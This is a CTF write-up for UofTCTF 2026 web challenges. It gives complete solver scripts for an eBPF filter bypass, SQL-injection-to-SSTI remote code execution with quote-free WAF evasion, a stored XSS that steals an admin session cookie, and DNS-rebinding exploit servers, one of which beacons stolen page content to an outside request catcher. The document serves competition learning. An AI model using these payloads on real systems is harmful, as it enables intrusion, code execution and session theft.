---
title: UofTCTF 2026 Writeup
date: 2026-01-12
layout: writeup
rank: 2
total_teams: 1729
team: Project Sekai
language: en
tags:
  - Web
---

I participated in UofTCTF 2026 as a member of Project Sekai. I solved 6(+1) web challenges.

# Firewall [35pt]

flag.html is hosted by Nginx and there is an eBPF packet filter.

```sh
#!/bin/sh
set -e

ARCH_DIR=$(gcc -print-multiarch 2>/dev/null || echo "x86_64-linux-gnu")
echo "[*] Compiling eBPF program..."
clang -O3 -g -target bpf \
  -I"/usr/include/${ARCH_DIR}" \
  -c /src/firewall.c -o /src/firewall.o

echo "[*] Setting up tc clsact on eth0..."
if ! tc qdisc show dev eth0 | grep -q clsact; then
  tc qdisc add dev eth0 clsact
fi

echo "[*] Attaching eBPF filter"

tc filter add dev eth0 ingress bpf da \
  obj /src/firewall.o sec tc/ingress

tc filter add dev eth0 egress bpf da \
  obj /src/firewall.o sec tc/ingress

echo "[*] eBPF filter loaded"

echo "[*] Starting flag server"
nginx -g "daemon off;"
```

```c
#include <linux/bpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/in.h>
#include <linux/tcp.h>
#include <linux/pkt_cls.h>

#define IP_MF  0x2000 /* "More Fragments" */
#define IP_OFFSET 0x1fff /* "Fragment Offset" */
#define MAX_PKT_LEN 0xffff
#define WINDOW_LEN 256
#define KW_LEN 4
static const char blocked_kw[KW_LEN] = "flag";
static const char blocked_char = '%';

struct kw_scan_ctx {
    struct __sk_buff *skb;
    __u32 off;
    __u32 len;
    __u32 found;
};


static long kw_scan_cb(__u32 idx, void *data)
{
    struct kw_scan_ctx *ctx = data;
    unsigned char buf[KW_LEN];

    // We guarantee idx + KW_LEN <= ctx->len from the caller, so no extra
    // bounds check is needed here for the packet.
     
    if (bpf_skb_load_bytes(ctx->skb, ctx->off + idx, buf, KW_LEN) < 0) {
        // Treat load error as found kw
        ctx->found = 1;
        return 1;
    }

    if (__builtin_memcmp(buf, blocked_kw, KW_LEN) == 0) {
        ctx->found = 1;
        return 1;
    }

    return 0;
}

__u32 __always_inline has_blocked_kw(struct __sk_buff *skb, __u32 off, __u32 len)
{
    if (off > MAX_PKT_LEN || off + len > MAX_PKT_LEN || len >= MAX_PKT_LEN)
        return 1;
    
    // Cannot match when length is shorter than KW_LEN
    if (len < KW_LEN) {
        return 0;
    }

    struct kw_scan_ctx ctx = {
        .skb   = skb,
        .off   = off,
        .len   = len,
        .found = 0,
    };

    // Use bpf_loop to make verifier happy
    __u32 nr_loops = len - KW_LEN + 1;

    long ret = bpf_loop(nr_loops, kw_scan_cb, &ctx, 0);
    if (ret < 0) {
        return 1;
    }

    return ctx.found ? 1 : 0;
}

static long char_scan_cb(__u32 idx, void *data)
{
    struct kw_scan_ctx *ctx = data;
    unsigned char buf[1];
     
    if (bpf_skb_load_bytes(ctx->skb, ctx->off + idx, buf, 1) < 0) {
        // Treat load error as found kw
        ctx->found = 1;
        return 1;
    }

    if (buf[0] == blocked_char) {
        ctx->found = 1;
        return 1;
    }

    return 0;
}


__u32 __always_inline has_blocked_char(struct __sk_buff *skb, __u32 off, __u32 len)
{
    if (off > MAX_PKT_LEN || off + len > MAX_PKT_LEN || len >= MAX_PKT_LEN)
        return 1;
    
    if (len < 1)
        return 0;

    struct kw_scan_ctx ctx = {
        .skb   = skb,
        .off   = off,
        .len   = len,
        .found = 0,
    };

    // Use bpf_loop to make verifier happy
    __u32 nr_loops = len;

    long ret = bpf_loop(nr_loops, char_scan_cb, &ctx, 0);
    if (ret < 0) {
        return 1;
    }

    return ctx.found ? 1 : 0;
}

SEC("tc/ingress")
int firewall_in(struct __sk_buff *skb) {
    void *data = (void *)(__u64)skb->data;
    void *data_end = (void *)(__u64)skb->data_end;
    
    // L2
    struct ethhdr *eth = data;
    if ((void *)(eth + 1) > data_end) {
        return TC_ACT_UNSPEC;
    }
    
    // Handle IPv4
    if (skb->protocol == bpf_htons(ETH_P_IP)) {
        struct iphdr * iph = (void *)(eth + 1);
        if ((void *)(iph + 1) > data_end) {
            return TC_ACT_UNSPEC;
        }
        if (iph->version != 4) {
            return TC_ACT_UNSPEC;
        }
        __u32 ip_hdr_size = (iph->ihl & 0x0F) << 2;
        if (ip_hdr_size < sizeof(*iph)) {
            return TC_ACT_UNSPEC;
        }
        if ((void *)iph + ip_hdr_size > data_end) {
            return TC_ACT_UNSPEC;
        }
        // Only allow a single fragment
        if (iph->frag_off & bpf_htons(IP_MF | IP_OFFSET)) {
            return TC_ACT_SHOT;
        }
        // Only care about TCP
        if (iph->protocol != IPPROTO_TCP) {
            return TC_ACT_UNSPEC;
        }
        __u16 ip_tot_len = bpf_ntohs(iph->tot_len);
        if (ip_hdr_size > ip_tot_len) {
            return TC_ACT_UNSPEC;
        }

        // Filter traffic
        if (has_blocked_kw(skb, ETH_HLEN + ip_hdr_size, ip_tot_len - ip_hdr_size)) {
            return TC_ACT_SHOT;
        }
        if (has_blocked_char(skb, ETH_HLEN + ip_hdr_size, ip_tot_len - ip_hdr_size)) {
            return TC_ACT_SHOT;
        }


        return TC_ACT_OK;
    } else if (skb->protocol == bpf_htons(ETH_P_IPV6)) {
        // No IPv6
        return TC_ACT_SHOT;
    }
    
    return TC_ACT_UNSPEC;
}

char _license[] SEC("license") = "GPL";
```

The filter blocks `flag` and `%` in TCP payload, like `GET /flag.html` or encoded url.
I sent fragmented request like `GET /fl` and `ag.html`.

My solver is here:
```py
import socket
import time

TARGET_IP = "35.227.38.232"
TARGET_PORT = 5000

START_OFFSET = 135  # start of uoftctf{...
CHUNK_SIZE = 6

def get_flag_fast():
    full_content = b""
    current_pos = START_OFFSET
    
    print(f"[*] Starting extraction from byte {START_OFFSET} with chunk size {CHUNK_SIZE}...")
    
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(2.0)
            s.connect((TARGET_IP, TARGET_PORT))
            
            # split request
            req_part1 = b"GET /fl"
            req_part2 = b"ag.html HTTP/1.1\r\n"
            
            # Request Range header for "current position" to "+5 bytes (total 6 bytes)"
            end_pos = current_pos + CHUNK_SIZE - 1
            headers = (
                f"Host: {TARGET_IP}\r\n"
                f"Range: bytes={current_pos}-{end_pos}\r\n"
                "Connection: close\r\n"
                "\r\n"
            ).encode()
            
            # send
            s.send(req_part1)
            time.sleep(0.1)
            s.send(req_part2 + headers)
            
            response = b""
            while True:
                try:
                    chunk = s.recv(4096)
                    if not chunk: break
                    response += chunk
                except socket.timeout:
                    break
            s.close()

            if b"\r\n\r\n" in response:
                body = response.split(b"\r\n\r\n", 1)[1]
                if len(body) == 0:
                    break
                
                full_content += body
                print(f"\rExtracted: {full_content.decode(errors='ignore')}", end="", flush=True)
                
                current_pos += len(body)
            else:
                break
                
        except Exception as e:
            print(f"\nError at pos {current_pos}: {e}")
            break

    return full_content.decode(errors='ignore')

if __name__ == "__main__":
    html = get_flag_fast()
    print("\n" + "-" * 30)
    print(html)
```
`uoftctf{f1rew4l1_Is_nOT_par7icu11rLy_R0bust_I_bl4m3_3bpf}`


# No Quotes [37pt]
A simple sql injection challenge. The goal is to exec `/readflag`.

username and password are injectable.
```py
    if waf(username) or waf(password):
        return render_template(
            "login.html",
            error="No quotes allowed!",
            username=username,
        )
    query = (
        "SELECT id, username FROM users "
        f"WHERE username = ('{username}') AND password = ('{password}')"
    )
```

WAF blocks single quote and double quote.
```py
def waf(value: str) -> bool:
    blacklist = ["'", '"']
    return any(char in value for char in blacklist)
```

And using raw templates in /home.
```py
@app.get("/home")
def home():
    if not session.get("user"):
        return redirect(url_for("index"))
    return render_template_string(open("templates/home.html").read() % session["user"])
```

If `session["user"]` is like `{{ 7*7 }}`, SSTI will be awakened. 
By the way, This application uses MariaDB. MariaDB parses hex to string automated. So I can embed SSTI payload in hex.

To bypass waf, I used `\` like this:
```
"username": "\\",
"password": f") UNION SELECT 1, 0x{hex_payload} #"
```

My final solver:
```py
import requests
import binascii
import sys

TARGET_URL = "https://no-quotes-48cbcd2e89d34629.chals.uoftctf.org"

def solve():
    print(f"[*] Target URL: {TARGET_URL}")
    
    ssti_payload = "{{ lipsum.__globals__.__builtins__.__import__('os').popen('/readflag').read() }}"
    
    # hex encode
    hex_payload = binascii.hexlify(ssti_payload.encode()).decode()
    print(f"[*] Hex Payload: 0x{hex_payload[:20]}...")

    # waf bypassed sql injection
    data = {
        "username": "\\",
        "password": f") UNION SELECT 1, 0x{hex_payload} #"
    }

    print("[*] Sending malicious login request...")
    session = requests.Session()
    
    try:
        response = session.post(f"{TARGET_URL}/login", data=data, allow_redirects=False, timeout=10)
    except Exception as e:
        print(f"[!] Request failed: {e}")
        sys.exit(1)

    if response.status_code == 302:
        print("[+] Login successful! Redirecting to /home...")
        
        # SSTI
        home_response = session.get(f"{TARGET_URL}/home")
        content = home_response.text
        
        if "uoftctf{" in content:
            start = content.find("uoftctf{")
            end = content.find("}", start) + 1
            flag = content[start:end]
            print("\n" + "="*40)
            print(f"FLAG: {flag}")
            print("="*40 + "\n")
        else:
            print("[-] Login worked, but flag not found in output.")
            print(content[:500])
    else:
        print("[-] Login failed.")

if __name__ == "__main__":
    solve()
```
`uoftctf{w0w_y0u_5UcC355FU1Ly_Esc4p3d_7h3_57R1nG!}`


# Personal Blog [40pt]
A simple note app. The goal is steal admin bot session and access to /flag.

In editor page, draft content is unescaped.
```html
<%- include('partials/page-start') %>
<section class="editor-shell">
  <div class="editor-header">
    <div>
      <p class="eyebrow">Edit</p>
      <h2>Post <%= post.id %></h2>
      <p class="muted">Only you can see this entry.</p>
    </div>
    <a class="button ghost" href="/dashboard">Back to posts</a>
  </div>

  <div class="editor-panel">
    <div id="editor" class="editor" data-post-id="<%= post.id %>" contenteditable="true"><%- draftContent %></div>
  </div>

  <div class="editor-actions">
    <button id="saveButton" class="button primary" type="button">Save</button>
    <a class="button ghost" href="/post/<%= post.id %>">View post</a>
  </div>
</section>

<script src="/static/dompurify/purify.min.js"></script>
<script src="/static/editor.js"></script>
<%- include('partials/page-end') %>
```

And html sanitized only client side when autosave.
```js
setInterval(async () => {
    const clean = window.DOMPurify.sanitize(editor.innerHTML);
    try {
        await postJson('/api/autosave', { postId, content: clean });
    } catch (err) {
        // ignore
    }
}, 30000);
```

```py
app.post('/api/autosave', requireLogin, (req, res) => {
  const db = req.db;
  const postId = Number.parseInt(req.body.postId, 10);
  if (!Number.isFinite(postId)) {
    return res.status(400).json({ ok: false });
  }
  const post = getPostById(db, req.user.id, postId);
  if (!post) {
    return res.status(404).json({ ok: false });
  }
  const rawContent = String(req.body.content || '');
  post.draftContent = rawContent;
  post.updatedAt = Date.now();
  saveDb(db);
  return res.json({ ok: true });
});
```

If sid is already exist, replaced in magic link.
```py
app.get('/magic/:token', (req, res) => {
  const db = req.db;
  const token = req.params.token;
  const record = db.magicLinks[token];
  if (!record) {
    return res.status(404).send('Invalid token.');
  }

  const existingSid = req.cookies.sid;
  if (existingSid) {
    res.cookie('sid_prev', existingSid, cookieOptions());
  }
  const sid = createSession(db, record.userId);
  saveDb(db);
  res.cookie('sid', sid, cookieOptions());

  const target = safeRedirect(req.query.redirect);
  return res.redirect(target);
});
```

Solution steps:
1. register and login
2. fetch autosave api with XSS payload in editor page (without client sanitization!)
3. generate magic link
4. report magic link and redirect to editor page (and solve PoW)
5. access to /flag with stolen admin session

My final payload is here:
{% raw %}
```py
#!/usr/bin/env python3
import subprocess
import random
import re
import string
import time
from urllib.parse import urlparse
import requests

BASE_URL = "http://34.26.148.28:5000"


# ---- PoW solver ----
def pow_solve(challenge: str) -> str:
    if not challenge or not isinstance(challenge, str):
        raise RuntimeError("PoW challenge missing/invalid")

    # curl -sSfL https://pwn.red/pow | sh -s <challenge>
    cmd = f"curl -sSfL https://pwn.red/pow | sh -s {challenge}"
    p = subprocess.run(
        cmd,
        shell=True,
        check=False,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
    )
    if p.returncode != 0:
        raise RuntimeError(
            "PoW solver failed\n"
            f"returncode={p.returncode}\n"
            f"stderr={p.stderr.strip()}"
        )

    sol = (p.stdout or "").strip()
    if not sol:
        raise RuntimeError("PoW solver returned empty output")

    return sol


# ---- exploit ----
def rand_str(n=10):
    alphabet = string.ascii_lowercase + string.digits
    return "".join(random.choice(alphabet) for _ in range(n))

def extract_first(pattern: str, text: str):
    m = re.search(pattern, text, re.IGNORECASE)
    return m.group(1) if m else None

def main():
    s = requests.Session()
    s.headers.update({"User-Agent": "ctf-autosolver/1.0"})

    username = "u_" + rand_str(10)
    password = "p_" + rand_str(16)

    # register
    r = s.post(f"{BASE_URL}/register", data={"username": username, "password": password}, allow_redirects=True, timeout=10)
    if r.status_code not in (200, 302):
        raise RuntimeError(f"register failed: {r.status_code}")

    # login
    r = s.post(f"{BASE_URL}/login", data={"username": username, "password": password}, allow_redirects=True, timeout=10)
    if r.status_code != 200:
        raise RuntimeError(f"login failed: {r.status_code}")
    if "/dashboard" not in r.url:
        if "Invalid username or password" in r.text:
            raise RuntimeError("login failed: invalid credentials")
        if not s.cookies.get("sid"):
            raise RuntimeError("login failed: sid cookie missing")

    # create post: GET /edit -> redirects /edit/<id>
    r = s.get(f"{BASE_URL}/edit", allow_redirects=True, timeout=10)
    if r.status_code != 200 or "/edit/" not in r.url:
        raise RuntimeError(f"create post failed: {r.status_code} url={r.url}")
    post_id = int(r.url.rstrip("/").split("/")[-1])

    # inject XSS into draft via /api/autosave (raw)
    xss = (
        "<script>"
        "(()=>{"
        "const m=document.cookie.match(/(?:^|;\\s*)sid_prev=([^;]+)/);"
        "if(!m)return;"
        "const v=m[1];"
        "fetch('/api/autosave',{method:'POST',credentials:'include',headers:{'Content-Type':'application/json'},"
        f"body:JSON.stringify({{postId:{post_id},content:'SID_PREV='+v}})"
        "}).catch(()=>{});"
        "})();"
        "</script>"
    )
    r = s.post(
        f"{BASE_URL}/api/autosave",
        json={"postId": post_id, "content": xss},
        timeout=10,
    )
    if r.status_code != 200 or not r.json().get("ok"):
        raise RuntimeError(f"autosave inject failed: {r.status_code} {r.text}")

    # generate magic link
    r = s.post(f"{BASE_URL}/magic/generate", data={}, allow_redirects=True, timeout=10)
    if r.status_code != 200:
        raise RuntimeError(f"magic generate failed: {r.status_code}")

    # parse token from /account
    r = s.get(f"{BASE_URL}/account", timeout=10)
    token_list = re.findall(r'href="/magic/([0-9a-f]{32})"', r.text, flags=re.IGNORECASE)
    if not token_list:
        raise RuntimeError("failed to parse magic token")
    token = token_list[-1]

    # build report target (relative path accepted)
    report_target = f"/magic/{token}?redirect=/edit/{post_id}"

    # get report page -> extract pow_challenge if present
    r = s.get(f"{BASE_URL}/report", timeout=10)
    pow_challenge = extract_first(r'name="pow_challenge"\s+value="([^"]+)"', r.text)

    report_data = {"url": report_target}
    if pow_challenge:
        pow_solution = pow_solve(pow_challenge)
        report_data["pow_challenge"] = pow_challenge
        report_data["pow_solution"] = pow_solution

    # submit report
    r = s.post(f"{BASE_URL}/report", data=report_data, allow_redirects=True, timeout=15)
    if r.status_code != 200:
        raise RuntimeError(f"report submit failed: {r.status_code}")

    # poll /edit/<id> until SID_PREV appears
    stolen_sid = None
    deadline = time.time() + 40.0
    while time.time() < deadline:
        time.sleep(2.0)
        rr = s.get(f"{BASE_URL}/edit/{post_id}", timeout=10)
        m = re.search(r"SID_PREV=([0-9a-f]{36})", rr.text, flags=re.IGNORECASE)
        if m:
            stolen_sid = m.group(1)
            break

    if not stolen_sid:
        raise RuntimeError("failed to steal sid_prev (timeout). bot may not have visited, or exploit blocked.")

    # use stolen admin sid to get flag
    parsed = urlparse(BASE_URL)
    domain = parsed.hostname
    admin = requests.Session()
    admin.headers.update({"User-Agent": "ctf-autosolver/1.0"})
    admin.cookies.set("sid", stolen_sid, domain=domain, path="/")

    rf = admin.get(f"{BASE_URL}/flag", timeout=10)
    if rf.status_code != 200:
        raise RuntimeError(f"flag fetch failed: {rf.status_code} body={rf.text[:200]}")
    print(rf.text)


if __name__ == "__main__":
    main()
```
{% endraw %}
`uoftctf{533M5_l1k3_17_W4snt_50_p3r50n41...}`


# No Quotes 2 [44pt]
3rd solve🥉

Double check filter is added to `No Quotes` challenge.
```py
if not username == row[0] or not password == row[1]:
    return render_template(
        "login.html",
        error="Invalid credentials.",
        username=username,
    )
```

I used SQL Quine technique like this: `REPLACE(<Template>, <Placeholder>, HEX(<Template>))`
Also I can't use quotes in payload, so I made webshell without quotes and sent command with query `?c=/readflag` in /home.
My new SSTI payload (non-quotes) is:
```
{{ url_for.__globals__.os.popen(request.args[request.args|list|first]).read() if request.args else 1 }}
```

Final solver:
```py
import requests
import re

TARGET_URL = "https://no-quotes-2-21f3529c187da3b2.chals.uoftctf.org"

def solve():
    print(f"[*] Target URL: {TARGET_URL}")

    # SSTI payload
    ssti_payload = "{{ url_for.__globals__.os.popen(request.args[request.args|list|first]).read() if request.args else 1 }}"
    
    username_input = ssti_payload + "\\"
    u_hex = "0x" + username_input.encode().hex().upper()

    # quine sql payload
    # ) UNION SELECT <username>, <password> #
    template = f") UNION SELECT {u_hex}, REPLACE(0x$, CHAR(36), HEX(0x$))#"
    template_hex = template.encode().hex().upper()
    
    password_input = template.replace("$", template_hex)

    print(f"[*] Username Payload: {username_input}")
    
    s = requests.Session()
    data = {
        "username": username_input,
        "password": password_input
    }
    
    print("[*] Sending Exploit...")
    res = s.post(f"{TARGET_URL}/login", data=data, allow_redirects=True)

    if "Welcome" not in res.text:
        print("[-] Login Failed.")
        
    print("[+] Login Successful! SSTI planted.")

    # RCE
    cmd = "/readflag"
    print(f"[*] Executing command: {cmd}")
    
    res = s.get(f"{TARGET_URL}/home", params={"c": cmd})

    flag_match = re.search(r"uoftctf\{.*?\}", res.text)
    if flag_match:
        print("\n" + "="*40)
        print(f"FLAG: {flag_match.group(0)}")
        print("="*40 + "\n")
    else:
        print("[-] Flag not found in output.")
        print("Output preview:", res.text[:200])

if __name__ == "__main__":
    solve()
```
`uoftctf{d1d_y0u_wR173_4_pr0P3r_qU1n3_0r_u53_INFORMATION_SCHEMA???}`


# No Quotes 3 [55pt]
**1st blood🩸**

The waf blocks also period.
```py
def waf(value: str) -> bool:
    blacklist = ["'", '"', "."]
    return any(char in value for char in blacklist)
```

And the filter checks if db response matches SHA256(password).
```py
if not username == row[0] or not hashlib.sha256(password.encode()).hexdigest() == row[1]:
    return render_template(
        "login.html",
        error="Invalid credentials.",
        username=username,
    )
```

I wrapped quine payload with SHA2: `SHA2(REPLACE(<Template>, <Placeholder>, HEX(<Template>)), 256)`.

To waf bypass, I use some techniques:
- In jinja2, strings can made by dict trick without quotes. `dict(os=1)|list|first` -> `os`
- Attributes access with `|attr`. `url_for.__globals__` -> `url_for|attr("__globals__")`

My final payload that all techniques constructed:
```py
import requests
import re

TARGET_URL = "https://no-quotes-3-7334bfb169c0a8d7.chals.uoftctf.org/"

# helper
def make_jinja_str(text):
    """
    example: 'os' -> "dict(os=1)|list|first"
    """
    return f"dict({text}=1)|list|first"

def solve():
    print(f"[*] Target URL: {TARGET_URL}")

    # SSTI payload
    str_globals = make_jinja_str("__globals__")
    str_os = make_jinja_str("os")
    str_popen = make_jinja_str("popen")
    str_read = make_jinja_str("read")
    str_args = make_jinja_str("args")
    str_get = make_jinja_str("get")
    str_c = make_jinja_str("c")

    payload_core = (
        f"url_for|attr({str_globals})|attr({str_get})({str_os})"
        f"|attr({str_popen})"
        f"(request|attr({str_args})|attr({str_get})({str_c}))"
        f"|attr({str_read})()"
    )

    safe_payload = (
        f"{{{{ {payload_core} if request|attr({str_args}) else 1 }}}}"
    )

    print("[*] Generated SSTI Payload (Snippet):")
    print(safe_payload[:80] + "...")

    # SQLi with quine
    username_input = safe_payload + "\\"
    u_hex = "0x" + username_input.encode().hex().upper()

    template = f") UNION SELECT {u_hex}, SHA2(REPLACE(0x$, 0x24, HEX(0x$)), 256)#"
    template_hex = template.encode().hex().upper()
    password_input = template.replace("$", template_hex)

    s = requests.Session()
    print("[*] Sending Exploit (Login)...")
    data = {
        "username": username_input,
        "password": password_input
    }
    
    try:
        res = s.post(f"{TARGET_URL}/login", data=data, allow_redirects=True)
    except Exception as e:
        print(f"[-] Connection failed: {e}")

    if "Welcome" not in res.text:
        print("[-] Login Failed.")
        print(res.text[:300])

    print("[+] Login Successful! SSTI planted.")

    # RCE
    cmd = "/readflag"
    print(f"[*] Executing command: {cmd}")
    
    try:
        res = s.get(f"{TARGET_URL}/home", params={"c": cmd})
    except Exception as e:
        print(f"[-] Request failed: {e}")

    if "uoftctf" in res.text:
        flag_match = re.search(r"uoftctf\{.*?\}", res.text)
        if flag_match:
            print("\n" + "="*40)
            print(f"FLAG: {flag_match.group(0)}")
            print("="*40 + "\n")
        else:
            print("[?] Flag pattern not matched exactly.")
            print(res.text)
    else:
        print("[-] Flag not found. Response preview:")
        print(res.text[:500])

if __name__ == "__main__":
    solve()
```
`uoftctf{r3cuR510n_7h30R3M_m0M3n7}`


# Unrealistic Client-Side Challenge - Flag 1 [276pt]
3rd solve🥉

the flag1 is in jwt token from `/flag`. To get flag, need `_is_loopback`.
```py
@app.get("/flag")
def flag():
    session = _parse_session()
    if not session:
        abort(403)
    if not _is_loopback(request.remote_addr):
        abort(403)

    flag = _read_flag_file("flag1.txt")
    resp = make_response("OK")
    issue_session_cookie(resp, int(session["sub"]), extra_claims={"flag": flag})
    return resp
```

```py
def _is_loopback(ip: Optional[str]) -> bool:
    return ip in {"127.0.0.1", "::1"}
```

Bot url must start with `http://127.0.0.1:5000`, but can bypass with userinfo like `http://127.0.0.1:5000@attacker.site`
```py
def _validate_bot_url(url: str) -> str:
    url = url.strip()
    if not url.startswith("http://127.0.0.1:5000"):
        raise ValueError("URL must start with http://127.0.0.1:5000")
    return url
```

For this challenge, I tried to use DNS rebinding like [rbndr](https://github.com/taviso/rbndr). But (maybe) chromium DNS pinning blocks my path. If chromium version is old, [this technique](https://www.intruder.io/research/split-second-dns-rebinding-in-chrome-and-safari) can be effective but chromium is latest.

After a while, I thought of using DNS resolving fail over. For example, the URL `make-{my-ip}-and-127-0-0-1-rr.1u.ms:5000` is resolved to my ip if my server is working in my ip, but resolved to localhost if my server is stopped.

Solution steps:
1. bot accesses to malicious DNS URL
2. resolve to attacker's server and cause CSRF
3. fetch /register, /login and /flag with resolving localhost
4. steal cookie with resolving attacker's server

In addition, I needed to reset browser's tcp connection forcibly to re-resolve DNS in 10sec (bot timeout).

My final exploit server is:
```py
import subprocess
import threading
import time
from flask import Flask, Response, request

app = Flask(__name__)

@app.get("/")
def index():
    body = r"""<!doctype html>
<meta charset="utf-8">
<title>light rebind</title>
<script>
(() => {
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));

  function postWindow(url, data, targetName) {
    const form = document.createElement("form");
    form.action = url;
    form.method = "POST";
    form.target = targetName;
    form.style.display = "none";

    for (const key in data) {
      const input = document.createElement("input");
      input.type = "hidden";
      input.name = key;
      input.value = data[key];
      form.appendChild(input);
    }

    document.body.appendChild(form);
    form.submit();
    document.body.removeChild(form);
  }

  const u = "u" + Math.random().toString(36).slice(2);
  const p = "p" + Math.random().toString(36).slice(2);

  async function attempt() {
    window.open("about:blank", "w1");
    await sleep(100);
    window.open("/cut", "w1");

    window.open("about:blank", "w2");
    await sleep(1000);
    postWindow("/register", { username: u, password: p }, "w2");

    window.open("about:blank", "w3");
    await sleep(500);
    postWindow("/login", { username: u, password: p }, "w3");

    window.open("about:blank", "w4");
    await sleep(500);
    window.open("/flag", "w4");

    window.open("about:blank", "w5");
    await sleep(3000);
    window.open("/steal", "w5");

    await sleep(5000);
  }

  attempt();
})();
</script>
"""
    resp = Response(body, mimetype="text/html")
    resp.headers["Connection"] = "close"
    return resp


@app.get("/cut")
def cut():
    def worker():
        try:
            subprocess.run(
                ["bash","-lc", "sudo iptables -I INPUT 1 -p tcp --dport 5000 -j REJECT --reject-with tcp-reset"],
                check=False
            )
            time.sleep(6)
        finally:
            subprocess.run(
                ["bash","-lc", "sudo iptables -D INPUT 1"],
                check=False
            )
    threading.Thread(target=worker, daemon=True).start()
    return ("cut", 200)


@app.get("/steal")
def steal():
    print("Cookie header =", request.headers.get("Cookie"))
    return ("steal", 200)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False, use_reloader=False)
```

I reported the malicious URL: `http://127.0.0.1:5000@make-{my-ip}-and-127-0-0-1-rr.1u.ms:5000`, and I got session.
the session is jwt token, so I can get the flag by base64 decode.
![](/assets/img/uoft_ctf_2026.md/flag1.png)

`uoftctf{h4v3_y0ur53lf_4_s4ndw1ch}`


# Unrealistic Client-Side Challenge - Flag 2 [357pt]
This challenge solved by my teammate, I upsolved.

The flag2 is in response from /motd, hosted on port 5001.
```py
@app.get("/motd")
def motd_redirect():
    return redirect(f"{get_motd_origin()}/motd", code=302)


@motd_app.get("/motd")
def motd():
    flag2 = _read_flag_file("flag2.txt") if _is_loopback(request.remote_addr) else None
    raw_motd = request.cookies.get(COOKIE_NAME_MOTD)
    motd_text = (
        unquote_plus(raw_motd)
        if raw_motd is not None
        else '"Go Go Squid! is peak fiction" - Sun Tzu'
    )
    resp = make_response(render_template("motd.html", motd=motd_text, flag=flag2))
    if request.cookies.get(COOKIE_NAME_MOTD) is None:
        resp.set_cookie(
            COOKIE_NAME_MOTD,
            motd_text,
            httponly=True,
            samesite="Lax",
            secure=False,
            path="/motd",
        )
    resp.headers["Content-Type"] = "text/html"
    resp.headers["Content-Security-Policy"] = "default-src 'none'; img-src http: https:; style-src 'self';"
    return resp
```

I need XSS instead of access to /flag. It is effective `window.opener` technique for other origin XSS. And the bot need to access `localhost:5001` so the exploit server and malicious URL should be port 5001.

My exploit server is:
```py
import subprocess
import threading
import time
from flask import Flask, Response, request

app = Flask(__name__)

@app.get("/")
def index():
    body = r"""<!doctype html>
<meta charset="utf-8">
<title>light rebind</title>
<script>
(() => {
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));

  async function attempt() {
    window.open("about:blank", "w1");
    await sleep(100);
    window.open("/cut", "w1");

    window.open("about:blank", "w2");
    await sleep(1000);
    window.win = window.open("/motd", "w2");

    await sleep(10000);
  }

  attempt();
})();
</script>
"""
    resp = Response(body, mimetype="text/html")
    resp.headers["Connection"] = "close"
    return resp


@app.get("/cut")
def cut():
    def worker():
        try:
            subprocess.run(
                ["bash","-lc", "sudo iptables -I INPUT 1 -p tcp --dport 5001 -j REJECT --reject-with tcp-reset"],
                check=False
            )
            time.sleep(6)
        finally:
            subprocess.run(
                ["bash","-lc", "sudo iptables -D INPUT 1"],
                check=False
            )
    threading.Thread(target=worker, daemon=True).start()

    return r"""<!DOCTYPE html>
<script>
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));
  (async () => {
    while (true) {
      await sleep(500);
      if (window.opener.window.win) {
        await sleep(1000);
        navigator.sendBeacon('https://xxxxxxxx.m.pipedream.net', window.opener.window.win.document.body.innerHTML.toString())
        break;
      }
    }
  })();
</script>
"""

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5001, debug=False, use_reloader=False)
```

I reported the malicious URL: `http://127.0.0.1:5000@make-{my-ip}-and-127-0-0-1-rr.1u.ms:5001`, and my request catcher received flag.
![](/assets/img/uoft_ctf_2026.md/flag2.png)


`uoftctf{3nc0d1n6_s0_c001}`
